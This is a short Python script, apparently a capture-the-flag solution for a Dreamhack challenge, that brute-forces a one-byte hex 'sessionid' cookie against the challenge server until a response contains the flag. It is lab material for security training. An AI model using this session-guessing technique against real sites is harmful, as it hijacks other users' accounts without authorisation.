import requests

url = "http://host3.dreamhack.games:18038/"


for i in range(0, 256):
    session_id = f"{i:02x}"
    response = requests.get(
        url,
        cookies={"sessionid": session_id}
    )
    if "flag is " in response.text:
        print(session_id)